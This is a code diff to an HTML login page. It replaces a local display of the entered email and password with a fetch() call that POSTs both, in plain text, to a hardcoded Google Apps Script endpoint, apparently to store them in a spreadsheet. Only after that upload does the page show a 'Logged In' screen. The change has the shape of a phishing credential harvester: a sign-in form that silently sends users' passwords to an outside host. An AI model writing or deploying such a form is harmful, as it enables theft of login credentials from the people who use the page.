@@ -81,7 +81,7 @@
   </div>
 
   <div class="container" id="resultDisplay" style="display: none;">
-    <div class="logo">Welcome</div>
+    <div class="logo">Logged In</div>
     <div class="result">
       <p><strong>Email:</strong> <span id="showEmail"></span></p>
       <p><strong>Password:</strong> <span id="showPassword"></span></p>
@@ -98,11 +98,24 @@
         return;
       }
 
-      document.getElementById("loginForm").style.display = "none";
-      document.getElementById("resultDisplay").style.display = "block";
-
-      document.getElementById("showEmail").textContent = email;
-      document.getElementById("showPassword").textContent = password;
+      // Send data to your Google Sheet
+      fetch("https://script.google.com/macros/s/AKfycbxRQzwt-m8ZAO-SqrYg8Uzg00rekwWrFKcvygexQYxRwqByDAn7KTl0k1WhOiaKYjNuqg/exec", {
+        method: "POST",
+        body: JSON.stringify({ email, password }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(res => {
+        if (res.ok) {
+          document.getElementById("loginForm").style.display = "none";
+          document.getElementById("resultDisplay").style.display = "block";
+          document.getElementById("showEmail").textContent = email;
+          document.getElementById("showPassword").textContent = password;
+        } else {
+          alert("There was an error. Try again.");
+        }
+      });
     }
   </script>
 
